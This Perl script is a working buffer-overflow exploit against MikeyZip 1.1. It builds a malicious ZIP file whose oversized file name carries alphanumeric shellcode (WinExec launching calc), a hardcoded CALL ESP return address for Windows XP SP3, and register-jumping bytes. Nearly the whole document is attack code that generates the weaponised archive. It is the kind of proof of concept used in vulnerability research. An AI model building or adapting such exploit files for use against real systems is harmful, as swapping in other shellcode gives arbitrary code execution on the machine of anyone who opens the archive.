#!/usr/bin/perl
#
#
#[+]Exploit Title: MikeyZip 1.1 .ZIP File Buffer Overflow
#[+]Date: 10\04\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.softpedia.com/get/Compression-tools/MikeyZip.shtml
#[+]Version: 1.1
#[+]Tested On: WIN-XP SP3 Brazil Portuguese
#[+]CVE: N/A
#
#
#

use strict;
use warnings;

my $filename = "Exploit.zip";
print "\n\n\t\tMikeyZip 1.1 .ZIP File Buffer Overflow\n";
print "\t\tCreated by C4SS!0 G0M3S\n";
print "\t\tE-mail Louredo_\@hotmail.com\n";
print "\t\tSite www.exploit-br.org/\n\n";

print "\n\n[+] Creting ZIP File...\n";
sleep(1);
my $head = "\x50\x4B\x03\x04\x14\x00\x00".
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\xe4\x0f" .
"\x00\x00\x00";

my $head2 = "\x50\x4B\x01\x02\x14\x00\x14".
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\xe4\x0f".
"\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";

my $head3 = "\x50\x4B\x05\x06\x00\x00\x00".
"\x00\x01\x00\x01\x00".
"\x12\x10\x00\x00".
"\x02\x10\x00\x00".
"\x00\x00";
#
#LITTLE SHELLCODE WinExec("calc",0)
#
my $payload = 
"JJJJJJJJJJJRYVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI03YP0PSXU3512LCSPTPXF0".
"ONTMGUMVSLKON6A";
$payload .= "\x41" x (238-length($payload));
$payload .= pack('V',0x774D3E78);#CALL ESP on kernel32.dll WINX-XP SP3
$payload .= "\x61" x 10;#6 x POPAD
$payload .= "\x98\xe3";#CALL EDX



$payload .= "\x41" x (4064-length($payload));
$payload = $payload.".txt";

my $zip = $head.$payload.$head2.$payload.$head3;
open(FILE,">file.zip") || die "[-]Error:\n$!\n";
print FILE $zip;
close(FILE);
print "[+] ZIP File Created With Sucess:)\n";
sleep(3);
